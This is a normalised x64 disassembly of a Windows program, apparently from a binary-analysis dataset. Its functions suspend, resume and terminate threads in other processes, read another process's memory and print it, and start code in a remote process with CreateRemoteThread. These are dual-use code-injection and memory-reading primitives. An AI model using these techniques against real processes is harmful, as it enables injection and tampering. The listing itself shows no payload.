cmovne rdx rsi
mov rcx rbp
call sub_1400115d0
test al al
je r-xdata
xor r8d r8d
mov dl 0x1
lea rcx [ rsp + 0x60 ]
call sub_14000f390
mov rbx rax
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
mov rcx rax
call sub_140007970
nop
cmp [ rsp + 0x78 ] 0x8
jb r-xdata
lea rdx [ r--data ]
lea r13 [ rw-data ]
mov rcx r13
call sub_14000ac10
mov rcx rax
call sub_140007970
mov rbx [ rbp ]
cmp rbx [ rbp + 0x8 ]
je r-xdata
test rbp rbp
je r-xdata
mov rcx [ rsp + 0x60 ]
call j_sub_14003ad04
mov edi 0x9
lea r15d [ rdi - 0x5 ]
mov al 0x1
mov rcx [ rsp + 0x88 ]
xor rcx rsp
call sub_14003a6a0
lea r11 [ rsp + 0x90 ]
mov rbx [ r11 + 0x38 ]
mov rbp [ r11 + 0x40 ]
mov rsi [ r11 + 0x48 ]
mov rsp r11
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
mov rcx [ rbp ]
test rcx rcx
je r-xdata
mov rax [ rax ]
movsxd rcx [ rax + 0x4 ]
add rcx rdi
mov rcx rsi
jmp r-xdata
mov [ rbp ] rsi
mov [ rbp + 0x8 ] rsi
mov [ rbp + 0x10 ] rsi
mov rcx rbp
call j_sub_14003ad04
call j_sub_14003ad04
mov rax [ rax ]
movsxd rcx [ rax + 0x4 ]
add rcx rdi
mov rcx rsi
jmp r-xdata
mov rdx [ r12 + 0x8 ]
call [ r12 ]
mov r11 [ rdi ]
movsxd rax [ r11 + 0x4 ]
mov [ rax + rdi + 0x58 ] r14w
mov edx 0x5
lea rcx [ rsp + 0x40 ]
call sub_140039e70
mov r12 rax
mov edx [ rbx + 0x8 ]
mov rcx rdi
call sub_140008400
mov rcx rax
mov edx 0x9
call sub_14000fe50
mov rdi rax
test rax rax
jne r-xdata
mov rax [ r12 ]
movsxd rcx [ rax + 0x4 ]
add rcx r12
test edi edi
je r-xdata
mov rcx [ rcx + r12 + 0x48 ]
mov rdx [ rcx ]
call [ rdx + 0x68 ]
cmp eax 0xffffffff
cmove edi r15d
mov rdx [ r12 + 0x8 ]
call [ r12 ]
mov r11 [ rdi ]
movsxd rax [ r11 + 0x4 ]
mov [ rax + rdi + 0x58 ] r14w
mov edx [ rbx + 0x10 ]
mov rcx rdi
call sub_140026d50
mov r12 rax
mov edx 0xa
mov rcx rax
call sub_1400085e0
mov edi esi
mov rcx [ r12 ]
movsxd rcx [ rcx + 0x4 ]
test [ rcx + r12 + 0x10 ] 0x6
jne r-xdata
add rbx 0x1c
cmp rbx [ rbp + 0x8 ]
mov edi 0x9
jne r-xdata
mov edx [ rcx + 0x10 ]
or edx edi
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
mov edx 0x5
lea rcx [ rsp + 0x30 ]
call sub_140039e70
mov rcx [ rw-data ]
movsxd rcx [ rcx + 0x4 ]
add rcx r13
mov rdx [ rax + 0x8 ]
call [ rax ]
mov r11 [ rw-data ]
movsxd rax [ r11 + 0x4 ]
mov [ rax + r13 + 0x58 ] r14w
mov edx 0x5
lea rcx [ rsp + 0x50 ]
call sub_140039e70
mov r12 rax
mov edx [ rbx + 0xc ]
mov rcx r13
call sub_140008400
mov rcx rax
movzx edx di
call sub_14000fe50
mov rdi rax
test rax rax
jne r-xdata
jmp r-xdata
xor r8d r8d
call sub_140003120
or edx r15d
sub_140030f40
mov rax rsp
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x70
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rbp
mov [ rax + 0x20 ] rsi
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x60 ] rax
mov r12 rcx
mov rbx [ rcx ]
cmp rbx [ rcx + 0x8 ]
je r-xdata
mov al 0x1
mov rcx [ rsp + 0x60 ]
xor rcx rsp
call sub_14003a6a0
lea r11 [ rsp + 0x70 ]
mov rbx [ r11 + 0x38 ]
mov rbp [ r11 + 0x40 ]
mov rsi [ r11 + 0x48 ]
mov rsp r11
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
lea r13 [ rw-data ]
mov r15d 0x20
lea r14d [ r15 - 0x1c ]
mov rcx rbx
mov rcx [ rbx ]
jmp r-xdata
lea rdx [ r--data ]
mov rcx r13
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
mov rcx rax
lea rdx [ r--data ]
mov edx 0x5
lea rcx [ rsp + 0x28 ]
call sub_140039e70
mov rbp rax
lea rdx [ r--data ]
mov rcx r13
call sub_14000ac10
mov rdi rax
test rax rax
jne r-xdata
call sub_14003d01c
mov esi eax
test eax eax
je r-xdata
movsxd rcx [ rax + 0x4 ]
add rcx r13
test edi edi
je r-xdata
mov rcx [ rcx + r13 + 0x48 ]
mov rax [ rcx ]
call [ rax + 0x68 ]
cmp eax 0xffffffff
cmove edi r14d
mov rax [ rw-data ]
mov rax [ rax ]
movsxd rcx [ rax + 0x4 ]
add rcx rdi
xor ecx ecx
jmp r-xdata
add rbx 0x28
cmp rbx [ r12 + 0x8 ]
jne r-xdata
mov edx [ rcx + 0x10 ]
or edx edi
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
xor r8d r8d
mov dl 0x1
lea rcx [ rsp + 0x38 ]
call sub_14000f390
mov rdi rax
lea rdx [ r--data ]
mov rcx r13
call sub_14000ac10
mov rcx rax
mov rdx rdi
call sub_14000ae70
nop
cmp [ rsp + 0x50 ] 0x8
jb r-xdata
cmp rax 0xffffffffffffffff
je r-xdata
mov rdx [ rbp + 0x8 ]
call [ rbp ]
mov r11 [ rdi ]
movsxd rax [ r11 + 0x4 ]
mov [ rax + rdi + 0x58 ] r15w
mov edx esi
mov rcx rdi
call sub_140008400
mov rcx rax
lea rdx [ r--data ]
call sub_14000ac10
mov r8d esi
xor edx edx
lea ecx [ rdx + 0x2 ]
call [ OpenThread@IAT ]
mov rdi rax
test rax rax
je r-xdata
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
xor r8d r8d
call sub_140003120
or edx 0x4
mov edx 0xa
mov rcx r13
call sub_1400085e0
xor edi edi
mov rax [ rw-data ]
movsxd rcx [ rax + 0x4 ]
test [ rcx + r13 + 0x10 ] 0x6
jne r-xdata
mov rcx [ rsp + 0x38 ]
call j_sub_14003ad04
jmp r-xdata
mov rcx rax
call [ ResumeThread@IAT ]
mov rcx rdi
call [ CloseHandle@IAT ]
lea rdx [ r--data ]
mov rcx r13
jmp r-xdata
call sub_14000ac10
sub_140031160
mov rax rsp
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x70
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rbp
mov [ rax + 0x20 ] rsi
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x60 ] rax
mov r12 rcx
mov rbx [ rcx ]
cmp rbx [ rcx + 0x8 ]
je r-xdata
mov al 0x1
mov rcx [ rsp + 0x60 ]
xor rcx rsp
call sub_14003a6a0
lea r11 [ rsp + 0x70 ]
mov rbx [ r11 + 0x38 ]
mov rbp [ r11 + 0x40 ]
mov rsi [ r11 + 0x48 ]
mov rsp r11
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
lea r13 [ rw-data ]
mov r15d 0x20
lea r14d [ r15 - 0x1c ]
mov rcx rbx
mov rcx [ rbx ]
jmp r-xdata
lea rdx [ r--data ]
mov rcx r13
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
mov rcx rax
lea rdx [ r--data ]
mov edx 0x5
lea rcx [ rsp + 0x28 ]
call sub_140039e70
mov rbp rax
lea rdx [ r--data ]
mov rcx r13
call sub_14000ac10
mov rdi rax
test rax rax
jne r-xdata
call sub_14003d01c
mov esi eax
test eax eax
je r-xdata
movsxd rcx [ rax + 0x4 ]
add rcx r13
test edi edi
je r-xdata
mov rcx [ rcx + r13 + 0x48 ]
mov rax [ rcx ]
call [ rax + 0x68 ]
cmp eax 0xffffffff
cmove edi r14d
mov rax [ rw-data ]
mov rax [ rax ]
movsxd rcx [ rax + 0x4 ]
add rcx rdi
xor ecx ecx
jmp r-xdata
add rbx 0x28
cmp rbx [ r12 + 0x8 ]
jne r-xdata
mov edx [ rcx + 0x10 ]
or edx edi
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
xor r8d r8d
mov dl 0x1
lea rcx [ rsp + 0x38 ]
call sub_14000f390
mov rdi rax
lea rdx [ r--data ]
mov rcx r13
call sub_14000ac10
mov rcx rax
mov rdx rdi
call sub_14000ae70
nop
cmp [ rsp + 0x50 ] 0x8
jb r-xdata
cmp rax 0xffffffffffffffff
je r-xdata
mov rdx [ rbp + 0x8 ]
call [ rbp ]
mov r11 [ rdi ]
movsxd rax [ r11 + 0x4 ]
mov [ rax + rdi + 0x58 ] r15w
mov edx esi
mov rcx rdi
call sub_140008400
mov rcx rax
lea rdx [ r--data ]
call sub_14000ac10
mov r8d esi
xor edx edx
lea ecx [ rdx + 0x2 ]
call [ OpenThread@IAT ]
mov rdi rax
test rax rax
je r-xdata
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
xor r8d r8d
call sub_140003120
or edx 0x4
mov edx 0xa
mov rcx r13
call sub_1400085e0
xor edi edi
mov rax [ rw-data ]
movsxd rcx [ rax + 0x4 ]
test [ rcx + r13 + 0x10 ] 0x6
jne r-xdata
mov rcx [ rsp + 0x38 ]
call j_sub_14003ad04
jmp r-xdata
mov rcx rax
call [ SuspendThread@IAT ]
mov rcx rdi
call [ CloseHandle@IAT ]
lea rdx [ r--data ]
mov rcx r13
jmp r-xdata
call sub_14000ac10
sub_140031380
mov rax rsp
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x70
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rbp
mov [ rax + 0x20 ] rsi
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x60 ] rax
mov r12 rcx
mov rbx [ rcx ]
cmp rbx [ rcx + 0x8 ]
je r-xdata
mov al 0x1
mov rcx [ rsp + 0x60 ]
xor rcx rsp
call sub_14003a6a0
lea r11 [ rsp + 0x70 ]
mov rbx [ r11 + 0x38 ]
mov rbp [ r11 + 0x40 ]
mov rsi [ r11 + 0x48 ]
mov rsp r11
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
lea r13 [ rw-data ]
mov r15d 0x20
lea r14d [ r15 - 0x1c ]
mov rcx rbx
mov rcx [ rbx ]
jmp r-xdata
lea rdx [ r--data ]
mov rcx r13
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
mov rcx rax
lea rdx [ r--data ]
mov edx 0x5
lea rcx [ rsp + 0x28 ]
call sub_140039e70
mov rbp rax
lea rdx [ r--data ]
mov rcx r13
call sub_14000ac10
mov rdi rax
test rax rax
jne r-xdata
call sub_14003d01c
mov esi eax
test eax eax
je r-xdata
movsxd rcx [ rax + 0x4 ]
add rcx r13
test edi edi
je r-xdata
mov rcx [ rcx + r13 + 0x48 ]
mov rax [ rcx ]
call [ rax + 0x68 ]
cmp eax 0xffffffff
cmove edi r14d
mov rax [ rw-data ]
mov rax [ rax ]
movsxd rcx [ rax + 0x4 ]
add rcx rdi
xor ecx ecx
jmp r-xdata
add rbx 0x28
cmp rbx [ r12 + 0x8 ]
jne r-xdata
mov edx [ rcx + 0x10 ]
or edx edi
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
xor r8d r8d
mov dl 0x1
lea rcx [ rsp + 0x38 ]
call sub_14000f390
mov rdi rax
lea rdx [ r--data ]
mov rcx r13
call sub_14000ac10
mov rcx rax
mov rdx rdi
call sub_14000ae70
nop
cmp [ rsp + 0x50 ] 0x8
jb r-xdata
cmp rax 0xffffffffffffffff
je r-xdata
mov rdx [ rbp + 0x8 ]
call [ rbp ]
mov r11 [ rdi ]
movsxd rax [ r11 + 0x4 ]
mov [ rax + rdi + 0x58 ] r15w
mov edx esi
mov rcx rdi
call sub_140008400
mov rcx rax
lea rdx [ r--data ]
call sub_14000ac10
mov r8d esi
xor edx edx
lea ecx [ rdx + 0x1 ]
call [ OpenThread@IAT ]
mov rdi rax
test rax rax
je r-xdata
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
xor r8d r8d
call sub_140003120
or edx 0x4
mov edx 0xa
mov rcx r13
call sub_1400085e0
xor edi edi
mov rax [ rw-data ]
movsxd rcx [ rax + 0x4 ]
test [ rcx + r13 + 0x10 ] 0x6
jne r-xdata
mov rcx [ rsp + 0x38 ]
call j_sub_14003ad04
jmp r-xdata
xor edx edx
mov rcx rax
call [ TerminateThread@IAT ]
mov rcx rdi
call [ CloseHandle@IAT ]
lea rdx [ r--data ]
mov rcx r13
jmp r-xdata
call sub_14000ac10
sub_1400315a0
mov rax rsp
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x70
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rbp
mov [ rax + 0x20 ] rsi
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x60 ] rax
mov r12 rcx
mov rbx [ rcx ]
cmp rbx [ rcx + 0x8 ]
je r-xdata
mov al 0x1
mov rcx [ rsp + 0x60 ]
xor rcx rsp
call sub_14003a6a0
lea r11 [ rsp + 0x70 ]
mov rbx [ r11 + 0x38 ]
mov rbp [ r11 + 0x40 ]
mov rsi [ r11 + 0x48 ]
mov rsp r11
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
lea r13 [ rw-data ]
mov r15d 0x20
lea r14d [ r15 - 0x1c ]
mov rcx rbx
mov rcx [ rbx ]
jmp r-xdata
lea rdx [ r--data ]
mov rcx r13
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
mov rcx rax
lea rdx [ r--data ]
mov edx 0x5
lea rcx [ rsp + 0x28 ]
call sub_140039e70
mov rbp rax
lea rdx [ r--data ]
mov rcx r13
call sub_14000ac10
mov rdi rax
test rax rax
jne r-xdata
call sub_14003d01c
mov esi eax
test eax eax
je r-xdata
movsxd rcx [ rax + 0x4 ]
add rcx r13
test edi edi
je r-xdata
mov rcx [ rcx + r13 + 0x48 ]
mov rax [ rcx ]
call [ rax + 0x68 ]
cmp eax 0xffffffff
cmove edi r14d
mov rax [ rw-data ]
mov rax [ rax ]
movsxd rcx [ rax + 0x4 ]
add rcx rdi
xor ecx ecx
jmp r-xdata
add rbx 0x28
cmp rbx [ r12 + 0x8 ]
jne r-xdata
mov edx [ rcx + 0x10 ]
or edx edi
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
xor r8d r8d
mov dl 0x1
lea rcx [ rsp + 0x38 ]
call sub_14000f390
mov rdi rax
lea rdx [ r--data ]
mov rcx r13
call sub_14000ac10
mov rcx rax
mov rdx rdi
call sub_14000ae70
nop
cmp [ rsp + 0x50 ] 0x8
jb r-xdata
lea rdx [ r--data ]
mov rcx r13
jmp r-xdata
mov rdx [ rbp + 0x8 ]
call [ rbp ]
mov r11 [ rdi ]
movsxd rax [ r11 + 0x4 ]
mov [ rax + rdi + 0x58 ] r15w
mov edx esi
mov rcx rdi
call sub_140008400
mov rcx rax
lea rdx [ r--data ]
call sub_14000ac10
xor r9d r9d
xor r8d r8d
lea edx [ r9 + 0x12 ]
mov ecx esi
call [ PostThreadMessageW@IAT ]
test eax eax
je r-xdata
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
xor r8d r8d
call sub_140003120
or edx 0x4
mov edx 0xa
mov rcx r13
call sub_1400085e0
xor edi edi
mov rax [ rw-data ]
movsxd rcx [ rax + 0x4 ]
test [ rcx + r13 + 0x10 ] 0x6
jne r-xdata
mov rcx [ rsp + 0x38 ]
call j_sub_14003ad04
jmp r-xdata
call sub_14000ac10
sub_1400317a0
mov rax rsp
push rbp
lea rbp [ rax - 0xd8 ]
sub rsp 0x1d0
mov [ rsp + 0x28 ] 0xfffffffffffffffe
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0xc0 ] rax
mov rbx rcx
mov [ rsp + 0x30 ] rcx
xor edi edi
mov [ rsp + 0x20 ] edi
mov [ rcx ] rdi
mov [ rcx + 0x8 ] rdi
mov [ rcx + 0x10 ] rdi
mov [ rsp + 0x20 ] 0x1
lea rax [ sub_140031b80 ]
mov [ rbp ] rax
mov esi 0x7
mov [ rbp + 0x20 ] rsi
mov [ rbp + 0x8 ] di
mov rcx [ r--data ]
mov [ rbp + 0x8 ] rcx
movzx eax [ r--data ]
mov [ rbp + 0x10 ] ax
mov [ rbp + 0x18 ] 0x5
lea rax [ rbp + 0x8 ]
cmp rsi 0x8
cmovae rax rcx
mov [ rax + 0xa ] di
mov [ rbp + 0x48 ] rsi
mov [ rbp + 0x40 ] rdi
mov [ rbp + 0x30 ] di
xor r8d r8d
lea edx [ rdi + 0x33 ]
lea rcx [ rbp + 0x30 ]
call sub_1400025a0
lea rcx [ rbp + 0x30 ]
cmp [ rbp + 0x48 ] 0x8
cmovae rcx [ rbp + 0x30 ]
lea r8d [ rdi + 0x66 ]
lea rdx [ r--data ]
call sub_14003a8c0
mov [ rbp + 0x40 ] 0x33
lea rax [ rbp + 0x30 ]
cmp [ rbp + 0x48 ] 0x8
cmovae rax [ rbp + 0x30 ]
mov [ rax + 0x66 ] di
lea rdx [ rbp ]
mov rcx rbx
call sub_140018d50
lea r11 [ sub_140031e80 ]
mov [ rbp - 0x60 ] r11
mov [ rbp - 0x40 ] rsi
mov [ rbp - 0x58 ] di
mov rcx [ r--data ]
mov [ rbp - 0x58 ] rcx
movzx eax [ r--data ]
mov [ rbp - 0x50 ] ax
mov [ rbp - 0x48 ] 0x5
lea rax [ rbp - 0x58 ]
cmp rsi 0x8
cmovae rax rcx
mov [ rax + 0xa ] di
mov [ rbp - 0x18 ] rsi
mov [ rbp - 0x20 ] rdi
mov [ rbp - 0x30 ] di
xor r8d r8d
lea edx [ rdi + 0x32 ]
lea rcx [ rbp - 0x30 ]
call sub_1400025a0
lea rcx [ rbp - 0x30 ]
cmp [ rbp - 0x18 ] 0x8
cmovae rcx [ rbp - 0x30 ]
lea r8d [ rdi + 0x64 ]
lea rdx [ r--data ]
call sub_14003a8c0
mov [ rbp - 0x20 ] 0x32
lea rax [ rbp - 0x30 ]
cmp [ rbp - 0x18 ] 0x8
cmovae rax [ rbp - 0x30 ]
mov [ rax + 0x64 ] di
lea rdx [ rbp - 0x60 ]
mov rcx rbx
call sub_140018d50
lea r11 [ sub_140031ea0 ]
mov [ rsp + 0x40 ] r11
mov [ rsp + 0x60 ] rsi
mov [ rsp + 0x48 ] di
mov rcx [ r--data ]
mov [ rsp + 0x48 ] rcx
mov eax [ r--data ]
mov [ rsp + 0x50 ] eax
movzx eax [ r--data ]
mov [ rsp + 0x54 ] ax
mov [ rsp + 0x58 ] rsi
lea rax [ rsp + 0x48 ]
cmp rsi 0x8
cmovae rax rcx
mov [ rax + 0xe ] di
mov [ rbp - 0x78 ] rsi
mov [ rbp - 0x80 ] rdi
mov [ rsp + 0x70 ] di
xor r8d r8d
lea edx [ rdi + 0x2d ]
lea rcx [ rsp + 0x70 ]
call sub_1400025a0
lea rcx [ rsp + 0x70 ]
cmp [ rbp - 0x78 ] 0x8
cmovae rcx [ rsp + 0x70 ]
lea r8d [ rdi + 0x5a ]
lea rdx [ r--data ]
call sub_14003a8c0
mov [ rbp - 0x80 ] 0x2d
lea rax [ rsp + 0x70 ]
cmp [ rbp - 0x78 ] 0x8
cmovae rax [ rsp + 0x70 ]
mov [ rax + 0x5a ] di
lea rdx [ rsp + 0x40 ]
mov rcx rbx
call sub_140018d50
lea r11 [ sub_140031ec0 ]
mov [ rbp + 0x60 ] r11
mov [ rbp + 0x80 ] rsi
mov [ rbp + 0x78 ] rdi
mov [ rbp + 0x68 ] di
lea r8d [ rdi + 0x5 ]
lea rdx [ r--data ]
lea rcx [ rbp + 0x68 ]
call sub_140001ea0
nop
mov [ rbp + 0xa8 ] rsi
mov [ rbp + 0xa0 ] rdi
mov [ rbp + 0x90 ] di
lea r8d [ rdi + 0x1b ]
lea rdx [ r--data ]
lea rcx [ rbp + 0x90 ]
call sub_140001ea0
nop
lea rdx [ rbp + 0x60 ]
mov rcx rbx
call sub_140018d50
nop
cmp [ rbp + 0xa8 ] 0x8
jb r-xdata
mov [ rbp + 0xa8 ] rsi
mov [ rbp + 0xa0 ] rdi
mov [ rbp + 0x90 ] di
cmp [ rbp + 0x80 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x90 ]
call j_sub_14003ad04
mov [ rbp + 0x80 ] rsi
mov [ rbp + 0x78 ] rdi
mov [ rbp + 0x68 ] di
cmp [ rbp - 0x78 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x68 ]
call j_sub_14003ad04
mov [ rbp - 0x78 ] rsi
mov [ rbp - 0x80 ] rdi
mov [ rsp + 0x70 ] di
cmp [ rsp + 0x60 ] 0x8
jb r-xdata
mov rcx [ rsp + 0x70 ]
call j_sub_14003ad04
mov [ rsp + 0x60 ] rsi
mov [ rsp + 0x58 ] rdi
mov [ rsp + 0x48 ] di
cmp [ rbp - 0x18 ] 0x8
jb r-xdata
mov rcx [ rsp + 0x48 ]
call j_sub_14003ad04
mov [ rbp - 0x18 ] rsi
mov [ rbp - 0x20 ] rdi
mov [ rbp - 0x30 ] di
cmp [ rbp - 0x40 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x30 ]
call j_sub_14003ad04
mov [ rbp - 0x40 ] rsi
mov [ rbp - 0x48 ] rdi
mov [ rbp - 0x58 ] di
cmp [ rbp + 0x48 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x58 ]
call j_sub_14003ad04
mov [ rbp + 0x48 ] rsi
mov [ rbp + 0x40 ] rdi
mov [ rbp + 0x30 ] di
cmp [ rbp + 0x20 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x30 ]
call j_sub_14003ad04
mov rax rbx
mov rcx [ rbp + 0xc0 ]
xor rcx rsp
call sub_14003a6a0
lea r11 [ rsp + 0x1d0 ]
mov rbx [ r11 + 0x18 ]
mov rsi [ r11 + 0x20 ]
mov rdi [ r11 + 0x28 ]
mov rsp r11
pop rbp
retn
mov rcx [ rbp + 0x8 ]
call j_sub_14003ad04
sub_140031b80
push rbp
sub rsp 0x3c0
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x390 ] rax
mov ecx 0x28
call sub_14003ac60
mov rbp rax
test rax rax
je r-xdata
xor ebp ebp
xor eax eax
mov [ rbp ] rax
mov [ rbp + 0x8 ] rax
mov [ rbp + 0x10 ] rax
mov [ rbp + 0x18 ] rax
mov [ rbp + 0x20 ] rax
jmp r-xdata
mov al 0x1
mov rcx [ rsp + 0x390 ]
xor rcx rsp
call sub_14003a6a0
add rsp 0x3c0
pop rbp
retn
mov rcx [ rbp ]
mov rdx [ rbp + 0x8 ]
mov r9d 0x350
cmp rcx 0xffffffffffffffff
jne r-xdata
mov rcx rbp
call sub_140031fa0
test al al
je r-xdata
lea rax [ rsp + 0x30 ]
lea r8 [ rsp + 0x40 ]
mov [ rsp + 0x30 ] 0x0
mov [ rsp + 0x20 ] rax
call [ ReadProcessMemory@IAT ]
test eax eax
je r-xdata
mov r8 rdx
lea rcx [ rsp + 0x40 ]
mov edx r9d
call sub_14003b740
test eax eax
sete al
test al al
je r-xdata
mov rcx [ rbp ]
call [ CloseHandle@IAT ]
cmp [ rsp + 0x30 ] 0x350
jne r-xdata
jmp r-xdata
mov [ rsp + 0x3d0 ] rbx
mov [ rsp + 0x3b0 ] r13
mov [ rsp + 0x3a8 ] r14
lea r14 [ rw-data ]
lea rdx [ r--data ]
mov rcx r14
call sub_14000ac10
mov edx [ rsp + 0x40 ]
mov rcx rax
call sub_140008400
mov rcx rax
call sub_140007970
lea rdx [ r--data ]
mov ebx 0x78
mov rcx rax
call sub_14000ac10
mov edx [ rsp + 0x44 ]
mov rcx rax
call sub_140008400
movzx edx bx
mov rcx rax
call sub_14000fe50
mov edx [ rsp + 0x48 ]
mov rcx rax
call sub_140008400
mov rcx rax
call sub_140007970
lea rdx [ r--data ]
mov rcx rax
call sub_14000ac10
mov rcx rax
call sub_140007970
mov rcx rax
call sub_140007970
mov r13d 0x1
cmp [ rsp + 0x48 ] r13d
jb r-xdata
mov r13 [ rsp + 0x3b0 ]
mov rbx [ rsp + 0x3d0 ]
mov r14 [ rsp + 0x3a8 ]
mov [ rsp + 0x3d8 ] rsi
mov [ rsp + 0x3e0 ] rdi
mov [ rsp + 0x3b8 ] r12
mov [ rsp + 0x3a0 ] r15
lea r12 [ rsp + 0x71 ]
lea r15d [ rbx - 0x74 ]
nop [ rax ] eax
mov edx 0xa
mov rcx r14
call sub_1400085e0
mov rax [ rw-data ]
xor ebx ebx
movsxd rcx [ rax + 0x4 ]
test [ rcx + r14 + 0x10 ] 0x6
jne r-xdata
mov rdi r12
nop [ rax + rax ] eax
movsxd rcx [ rax + 0x4 ]
add rcx r14
test ebx ebx
je r-xdata
mov rcx [ rcx + r14 + 0x48 ]
mov rax [ rcx ]
call [ rax + 0x68 ]
cmp eax 0xffffffff
mov rax [ rw-data ]
cmove ebx r15d
test cl cl
js r-xdata
mov al 0x78
jmp r-xdata
inc r13d
add r12 0x20
cmp r13d [ rsp + 0x48 ]
jbe r-xdata
mov edx [ rcx + 0x10 ]
or edx ebx
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
mov al 0x2a
cmp cl 0xc
je r-xdata
mov edx 0x20
mov rcx r14
movzx ebx al
call sub_14000fe50
movzx edx bx
mov rcx rax
call sub_14000fe50
inc esi
inc rdi
cmp esi [ rsp + 0x44 ]
jbe r-xdata
mov edx 0x9
mov rcx r14
call sub_14000fe50
mov esi 0x1
cmp [ rsp + 0x44 ] esi
jb r-xdata
mov r15 [ rsp + 0x3a0 ]
mov r12 [ rsp + 0x3b8 ]
mov rdi [ rsp + 0x3e0 ]
mov rsi [ rsp + 0x3d8 ]
xor r8d r8d
call sub_140003120
or edx r15d
movzx ecx [ rdi ]
cmp cl 0xb
jne r-xdata
movzx eax cl
and al 0xf
cmp al 0xd
jne r-xdata
cmp al 0xe
jne r-xdata
mov al 0x3f
jmp r-xdata
and cl 0xf0
cmp cl 0x40
jne r-xdata
mov al 0x3c
jmp r-xdata
mov al 0x2e
jmp r-xdata
test al al
jne r-xdata
add al 0x30
jmp r-xdata
mov al 0x20
jmp r-xdata
sub_140031ee0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x40
mov esi ecx
mov ecx 0x28
xor dil dil
call sub_14003ac60
mov rbx rax
test rax rax
je r-xdata
xor ebx ebx
xor eax eax
mov [ rbx ] rax
mov [ rbx + 0x8 ] rax
mov [ rbx + 0x10 ] rax
mov [ rbx + 0x18 ] rax
mov [ rbx + 0x20 ] rax
jmp r-xdata
mov rcx rbx
call j_sub_14003ad04
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
movzx eax dil
add rsp 0x40
pop rdi
retn
mov r9 [ rsi + rbx ]
mov rcx [ rbx ]
mov [ rsp + 0x30 ] 0x0
xor r8d r8d
xor edx edx
mov [ rsp + 0x28 ] 0x0
mov [ rsp + 0x20 ] 0x0
call [ CreateRemoteThread@IAT ]
mov rsi rax
test rax rax
je r-xdata
mov rcx rbx
call sub_140031fa0
test al al
je r-xdata
or edx 0xffffffff
mov rcx rax
mov dil 0x1
call [ WaitForSingleObject@IAT ]
mov rcx rsi
call [ CloseHandle@IAT ]
sub_140031fa0
mov rax rsp
push rbp
push r12
push r13
push r14
push r15
mov rbp rsp
sub rsp 0x50
mov [ rbp - 0x18 ] 0xfffffffffffffffe
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
mov rax [ rw-data ]
xor rax rsp
mov [ rbp - 0x8 ] rax
mov rbx rcx
xor r12d r12d
mov [ rcx ] r12
mov [ rcx + 0x8 ] r12
mov [ rcx + 0x10 ] r12
mov [ rcx + 0x18 ] r12
mov [ rcx + 0x20 ] r12
lea ecx [ r12 + 0x20 ]
call sub_14003ac60
mov r13 rax
test rax rax
je r-xdata
mov r13 r12
mov [ rax ] r12
mov [ rax + 0x8 ] r12
mov [ rax + 0x10 ] r12
jmp r-xdata
mov rsi r12
mov [ rax + 0x18 ] 0x7
mov [ rax + 0x10 ] r12
mov [ rax ] r12w
mov r8d 0xb
lea rdx [ r--data ]
mov rcx rax
call sub_140001ea0
jmp r-xdata
mov ecx 0x28
call sub_14003ac60
mov rsi rax
mov [ rbp - 0x20 ] rax
test rax rax
je r-xdata
test rsi rsi
je r-xdata
mov ecx 0x20
call sub_14003ac60
mov rdi rax
test rax rax
je r-xdata
mov rdx rsi
mov rcx r13
call sub_14000c0b0
test al al
je r-xdata
test r13 r13
je r-xdata
cmp [ rsi + 0x18 ] 0x8
jb r-xdata
mov rdi r12
mov [ rax ] r12
mov [ rax + 0x8 ] r12
mov [ rax + 0x10 ] r12
jmp r-xdata
mov rcx [ rbx ]
test rcx rcx
je r-xdata
mov rcx r13
call sub_14000d510
mov rcx r13
call j_sub_14003ad04
mov [ rsi + 0x18 ] 0x7
mov [ rsi + 0x10 ] r12
mov [ rsi ] r12w
mov rcx rsi
call j_sub_14003ad04
mov rcx [ rsi ]
call j_sub_14003ad04
test rdi rdi
je r-xdata
mov rax [ rdi ]
mov r12 [ rax + 0x18 ]
movsxd r14 [ rax + 0x20 ]
